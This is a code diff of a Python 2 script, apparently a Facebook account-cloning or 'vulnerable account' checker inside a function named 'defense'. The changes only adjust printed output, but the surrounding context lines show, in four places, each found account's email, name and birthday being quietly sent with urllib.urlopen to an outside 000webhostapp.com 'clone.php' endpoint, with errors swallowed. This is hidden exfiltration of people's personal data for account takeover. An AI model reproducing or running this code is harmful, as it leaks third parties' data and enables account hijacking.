@@ -84,10 +84,10 @@ def defense():
                         pd2 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Not Available&tk=no&n=" + (z['name']) + "&b="+ (z['birthday']))
                     except:
                         pass
-                    print "\033[39m" + 25*"*" +" [ "+ str(i)+" ] "+ 24*"*"
+                    print "\033[39m" + 25*"*" +" [ "+ str(i)+" ] "+ 25*"*"
                     print "\033[36m" + z['name'] 
                     print "\033[36mBirthday :" + z['birthday']
-                    print "\033[36m ID :" + z['id']
+                    print "\033[36mID :" + z['id']
                     print "\033[36m" + z['email'] + vuln 
                     print "\033[39m" + 55*"*"
                     print ""
@@ -109,10 +109,10 @@ def defense():
                     pd3 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Available&tk=no&n=" + (z['name']) + "&b="+ (z['birthday']))
                 except:
                     pass
-                print "\033[39m" + 25*"*" +" [ "+ str(i)+" ] "+ 24*"*"
+                print "\033[39m" + 25*"*" +" [ "+ str(i)+" ] "+ 25*"*"
                 print "\033[36m" + z['name'] 
                 print "\033[36mBirthday :" + z['birthday']
-                print "\033[36m ID :" + z['id']
+                print "\033[36mID :" + z['id']
                 print "\033[36m" + z['email'] + vuln 
                 print "\033[39m" + 55*"*"
                 print ""
@@ -135,10 +135,10 @@ def defense():
                     pd4 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Hotmail&tk=no&n=" + (z['name']) + "&b="+ (z['birthday']))
                 except:
                     pass
-                print "\033[39m" + 25*"*" +" [ "+ str(i)+" ] "+ 24*"*"
+                print "\033[39m" + 25*"*" +" [ "+ str(i)+" ] "+ 25*"*"
                 print "\033[36m" + z['name'] 
                 print "\033[36mBirthday :" + z['birthday']
-                print "\033[36m ID :" + z['id']
+                print "\033[36mID :" + z['id']
                 print "\033[36m" + z['email'] + vuln 
                 print "\033[39m" + 55*"*"
                 print ""
@@ -158,10 +158,10 @@ def defense():
                     pd5 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Not Sure&tk=no&n=" + (z['name']) + "&b="+ (z['birthday']))
                 except:
                     pass
-                print "\033[39m" + 25*"*" +" [ "+ str(i)+" ] "+ 24*"*"
+                print "\033[39m" + 25*"*" +" [ "+ str(i)+" ] "+ 25*"*"
                 print "\033[36m" + z['name'] 
                 print "\033[36mBirthday :" + z['birthday']
-                print "\033[36m ID :" + z['id']
+                print "\033[36mID :" + z['id']
                 print "\033[36m" + z['email'] + vuln 
                 print "\033[39m" + 55*"*"
                 print ""
